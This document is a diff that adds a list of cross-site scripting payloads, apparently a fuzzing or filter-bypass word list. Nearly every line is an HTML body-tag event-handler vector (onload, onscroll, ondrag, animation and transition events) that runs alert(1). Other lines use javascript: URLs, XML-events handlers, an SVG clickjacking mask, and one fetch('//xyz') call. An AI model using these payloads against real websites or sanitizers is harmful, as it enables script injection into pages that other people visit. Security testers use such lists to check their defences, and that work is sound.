@@ -1,0 +1,70 @@
+<body onorientationchange=alert(1)>
+<body onload=alert(1)>
+<body onpageshow=alert(1)>
+<body onfocus=alert(1)>
+<body style=overflow:auto;height:1000px onscroll=alert(1) id=x>#x
+<body onscroll=alert(1)><br><br><br><br>
+<body onresize=alert(1)>press F12!
+<body onhelp=alert(1)>press F1! (MSIE)
+<body draggable="true" ondrag="alert(1)">test</body>
+<body draggable="true" ondragend="alert(1)">test</body>
+<body draggable="true" ondragenter="alert(1)">test</body>
+<body draggable="true" ondragleave="alert(1)">test</body>
+<body draggable="true" ondragstart="alert(1)">test</body>
+<body id=x tabindex=1 onactivate=alert(1)></body>
+<body id=x tabindex=1 onbeforeactivate=alert(1)></body>
+<body id=x tabindex=1 onbeforedeactivate=alert(1)></body><input autofocus>
+<body id=x tabindex=1 ondeactivate=alert(1)></body><input id=y autofocus>
+<body id=x tabindex=1 onfocus=alert(1)></body>
+<body id=x tabindex=1 onfocusin=alert(1)></body>
+<body onafterprint=alert(1)>
+<body onbeforecopy="alert(1)" contenteditable>test</body>
+<body onbeforecut="alert(1)" contenteditable>test</body>
+<body onbeforepaste="alert(1)" contenteditable>test</body>
+<body onbeforeprint=alert(1)>
+<body onbeforeunload="location='javascript:alert(1)'">
+<body onblur=alert(1) id=x><iframe id=x>
+<body onclick="alert(1)">test</body>
+<body oncontextmenu="alert(1)">test</body>
+<body oncopy="alert(1)" contenteditable>test</body>
+<body oncut="alert(1)" contenteditable>test</body>
+<body ondblclick="alert(1)">test</body>
+<body onerror=alert(1) onload=/>
+<body onfocusout=alert(1) id=x><iframe id=x>
+<body onhashchange="alert(1)">
+<body onkeydown="alert(1)" contenteditable>test</body>
+<body onkeypress="alert(1)" contenteditable>test</body>
+<body onkeyup="alert(1)" contenteditable>test</body>
+<body onload=alert(1)>
+<body onmessage=alert(1)>
+<body onmousedown="alert(1)">test</body>
+<body onmouseenter="alert(1)">test</body>
+<body onmouseleave="alert(1)">test</body>
+<body onmousemove="alert(1)">test</body>
+<body onmouseout="alert(1)">test</body>
+<body onmouseover="alert(1)">test</body>
+<body onmouseup="alert(1)">test</body>
+<body onpageshow=alert(1)>
+<body onpaste="alert(1)" contenteditable>test</body>
+<body onpopstate=alert(1)>
+<body onresize="alert(1)">
+<body onscroll=alert(1)><div style=height:1000px></div><div id=x></div>
+<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>
+<body onwheel=alert(1)>
+<div draggable="true" contenteditable>drag me</div><body ondragover=alert(1) contenteditable>drop here</body>
+<div draggable="true" contenteditable>drag me</div><body ondrop=alert(1) contenteditable>drop here</body>
+<style>:target {color: red;}</style><body id=x style="transition:color 10s" ontransitioncancel=alert(1)></body>
+<style>:target {color:red;}</style><body id=x style="transition:color 1s" ontransitionend=alert(1)></body>
+<style>:target {transform: rotate(180deg);}</style><body id=x style="transition:transform 2s" ontransitionrun=alert(1)></body>
+<style>@keyframes slidein {}</style><body style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></body>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><body id=x style="position:absolute;" onanimationcancel="alert(1)"></body>
+<style>@keyframes x{}</style><body style="animation-name:x" onanimationend="alert(1)"></body>
+<style>@keyframes x{}</style><body style="animation-name:x" onanimationstart="alert(1)"></body>
+<body/onload=&lt;!--&gt;&#10alert(1)>
+<BODY BACKGROUND="javascript:alert('XSS')">
+<BODY ONLOAD=alert('XSS')>
+<HTML><BODY>
+<body>Hello</body>
+<div id="84"><x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="javascript:alert(84)//#x"/>//["'`-->]]>]</div><div id="85"><x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="test.evt#x"/>//["'`-->]]>]</div><div id="86"><body oninput=alert(86)><input autofocus>//["'`-->]]>]</div>
+<body style="background:gray">
+<svg:svg><svg:mask id="maskForClickjacking" maskUnits="objectBoundingBox" maskContentUnits="objectBoundingBox"><svg:rect x="0.0" y="0.0" width="0.373" height="0.3" fill="white"/><svg:circle cx="0.45" cy="0.7" r="0.075" fill="white"/></svg:mask></svg:svg></body>
